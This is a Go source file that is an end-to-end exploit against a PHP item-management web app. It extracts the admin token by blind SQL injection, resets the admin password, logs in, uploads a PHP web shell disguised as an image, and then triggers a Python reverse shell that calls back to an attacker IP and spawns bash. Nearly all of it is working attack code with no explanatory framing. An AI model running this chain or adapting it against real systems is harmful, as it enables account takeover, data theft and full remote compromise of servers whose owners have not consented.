package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

func getToken(ip string) string {
	var result []rune = make([]rune, 15)
	strings := []rune("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	for i := 0; i < 15; i++ {
		for _, v := range strings {
			url := fmt.Sprint("http://" + ip + "/item/viewItem.php?id=-1%20union%20select%201,2,3,4,5,token%20from%20user%20where%20ascii(substring(token," + strconv.Itoa(i+1) + ",1))=" + strconv.Itoa(int(v)) + "%20and%20id_level=1")
			resp, _ := http.Get(url)
			if resp.StatusCode == 404 {
				result[i] = v
				fmt.Println(string(v), "", i)

				break
			}
		}
	}
	return string(result)
}

func resetPassword(token, passwd, ip string) error {
	url := fmt.Sprint("http://" + ip + "/login/doChangePassword.php?token=" + token + "&password=" + passwd)
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	result, err := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(result), "Invalid") || err != nil {
		fmt.Print("Error when reset password")
		return err
	}
	return nil
}

func getSession(passwd, ip string) (string, error) {
	u := fmt.Sprint("http://" + ip + "/login/checkLogin.php")
	resp, _ := http.Get(u)
	data := url.Values{
		"username": {"admin"},
		"password": {passwd},
	}
	session := resp.Header.Values("Set-Cookie")[0][:36]
	req, _ := http.NewRequest(http.MethodPost, u, strings.NewReader(data.Encode()))
	req.Header.Add("Cookie", session)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.PostForm = data
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Print(err)
	}
	a, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(a), "Oops") {
		return "", fmt.Errorf("Login fail")
	}
	return session, nil
}

func uploadFile(session, ip string) error {
	u := fmt.Sprint("http://" + ip + "/item/updateItem.php")
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	id, _ := writer.CreateFormField("id")
	id.Write([]byte("1"))
	id_user, _ := writer.CreateFormField("id_user")
	id_user.Write([]byte("1"))
	name, _ := writer.CreateFormField("name")
	name.Write([]byte("Raspery Pi 4"))
	file, _ := writer.CreateFormFile("image", "rce.phar")
	file.Write([]byte(`<?php system($_GET["cmd"]); ?>`))
	description, _ := writer.CreateFormField("description")
	description.Write([]byte("Hello world"))
	price, _ := writer.CreateFormField("price")
	price.Write([]byte("92"))
	writer.Close()
	req, _ := http.NewRequest(http.MethodPost, u, body)
	req.Header.Add("Cookie", session)
	req.Header.Add("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	fmt.Print(req.Header)
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("Upload file err")
	}
	content, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(content), "Success") {
		fmt.Print("Upload success")
		return nil
	}
	return nil
}

func getShell(urli, port, ip string) {
	u := fmt.Sprint("http://" + urli + `/item/image/rce.phar?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22` + ip + `%22,` + port + `));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27`)
	resp, err := http.Get(u)
	a, _ := ioutil.ReadAll(resp.Body)
	fmt.Print(string(a))
	if err != nil {
		fmt.Print(err)
	}
}

func main() {

	token := getToken("192.168.0.100")
	fmt.Println(token)
	err := resetPassword(token, "123456", "192.168.0.100")
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("Reset password successful: " + "1234567")
		session, err := getSession("123456", "192.168.0.100")
		if err != nil {
			fmt.Println(err)
		}
		err = uploadFile(session, "192.168.0.100")
		if err != nil {
			fmt.Println(err)
		}

	}
	getShell("192.168.0.100", "8081", "192.168.0.109")

}
